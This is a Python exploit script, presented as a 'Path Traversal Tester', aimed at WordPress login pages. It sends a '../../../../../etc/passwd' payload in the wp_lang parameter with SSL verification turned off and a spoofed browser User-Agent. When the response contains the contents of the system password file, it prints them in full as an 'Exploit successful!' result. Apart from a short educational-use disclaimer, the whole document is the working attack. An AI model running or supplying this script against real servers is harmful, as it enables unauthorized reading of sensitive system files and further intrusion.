#!/usr/bin/env python3

import requests
import urllib3
from colorama import init, Fore, Style
from urllib.parse import urlparse

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

def check_url(url):
    """Validate and format the URL"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

def test_path_traversal(url):
    """Test for path traversal vulnerability"""
    try:
        # Format URL properly
        url = check_url(url)
        
        # Test payload
        payload = '../../../../../etc/passwd'
        
        # Make request with proper headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(
            url,
            params={'wp_lang': payload},
            headers=headers,
            verify=False,
            timeout=10
        )
        
        # Check response
        if response.status_code == 200:
            if "root:x:0:0:root" in response.text:
                print(f"{Fore.GREEN}[+] Exploit successful! Accessed content:")
                print(f"{Fore.GREEN}{response.text}")
            else:
                print(f"{Fore.YELLOW}[!] Accessed content, but the expected file was not found:")
                print(f"{Fore.YELLOW}{response.text}")
        elif response.status_code in {400, 401, 403, 404}:
            print(f"{Fore.RED}[-] Client error, status code: {response.status_code}")
        elif response.status_code // 100 == 5:
            print(f"{Fore.RED}[-] Server error, status code: {response.status_code}")
        elif response.status_code // 100 == 3:
            print(f"{Fore.YELLOW}[!] Redirection, status code: {response.status_code}")
        else:
            print(f"[*] Status code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Error making request: {str(e)}")
    except Exception as e:
        print(f"{Fore.RED}[-] Unexpected error: {str(e)}")

def main():
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║                Path Traversal Tester v1.0                ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[!] WARNING: This tool is for educational purposes only!")
    print(f"[!] Only use on systems you have permission to test!{Style.RESET_ALL}\n")
    
    url = input(f"{Fore.CYAN}[?] Enter target URL (e.g., example.com/wp-login.php): {Style.RESET_ALL}")
    test_path_traversal(url)

if __name__ == "__main__":
    main()